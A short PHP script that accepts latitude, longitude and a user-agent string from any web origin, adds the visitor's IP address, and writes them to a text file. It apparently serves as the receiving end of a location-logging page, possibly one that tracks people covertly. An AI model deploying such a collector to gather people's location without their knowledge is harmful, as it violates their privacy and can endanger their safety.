




<?php

// Add these headers at the beginning of your PHP file
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET");
header("Access-Control-Allow-Headers: Content-Type");


$myfile = fopen("location.txt", "w");
$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser agent:" . $_GET["uagent"];
fwrite($myfile, $txt);
fclose($myfile);

?>
